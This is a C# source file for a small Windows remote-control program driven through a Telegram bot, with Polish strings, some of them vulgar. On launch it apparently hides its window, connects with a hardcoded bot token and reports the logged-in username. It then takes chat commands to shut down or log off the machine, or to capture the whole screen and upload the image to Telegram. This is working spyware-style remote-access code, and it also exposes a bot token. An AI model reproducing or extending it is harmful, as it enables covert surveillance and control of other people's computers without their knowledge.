using System;
using Telegram.Bot;
using Telegram.Bot.Args;
using System.Threading;
using System.Net.NetworkInformation;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;

namespace ShadeControll
{
    class Program
    {
        static TelegramClient Client;
        static void Main()
        {
            Ninja.Hide();
            Client = new TelegramClient("1774037430:AAHnjjeOUNvn-ZpyCCo_6mIhztp_GkagsVg");
            while(!Client.Connect())
            {
                Console.WriteLine("Connecting..");
                Thread.Sleep(1000);
            }
            Client.SendMessage("Połączono z Komputerem - " + Environment.UserName + "\n /help");
            Client.NewMessage += Client_NewMessage;

            while (true) { Thread.Sleep(1000); }
        }

        private static void Client_NewMessage(string message)
        {
            switch (message)
            {
                case "/help":
                    Client.SendMessage("/help /shutdown /logout /screenshot");
                    break;

                case "/test":
                    Client.UploadFile("test.jpg","jebanie");
                    break;

                case "/shutdown":
                    Client.SendMessage("Wyłączanie Komputera");
                    Shutdown();
                    break;

                case "/logout":
                    Client.SendMessage("Wylogowywanie");
                    LogOut();
                    break;

                case "/screenshot":
                    TakeSCR();
                    break;
            }
        }

        private static void Shutdown()
        {
            Thread.Sleep(5000);
            Console.WriteLine("WYŁĄCZANIE");
            Process.Start("shutdown", "/s /t 0");
        }

        private static void LogOut()
        {
            Thread.Sleep(5000);
            Console.WriteLine("WYLOGOWYWANIE");
            Process.Start("shutdown","/l");
        }

        private static void TakeSCR()
        {
            if (!Directory.Exists("SCR")) { Directory.CreateDirectory("SCR"); }

            Bitmap captureBitmap = new Bitmap(1920, 1080, PixelFormat.Format32bppArgb);
            Rectangle captureRectangle = new Rectangle(new Point(0, 0), new Size(1920, 1080));
            Graphics captureGraphics = Graphics.FromImage(captureBitmap);
            captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
            string fileName = "SCR/" +  DateTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".jpg";
            captureBitmap.Save(fileName, ImageFormat.Jpeg);
            Thread.Sleep(1000);
            Client.UploadFile(fileName, "elo pomelo szmaty");
        }
    }
}
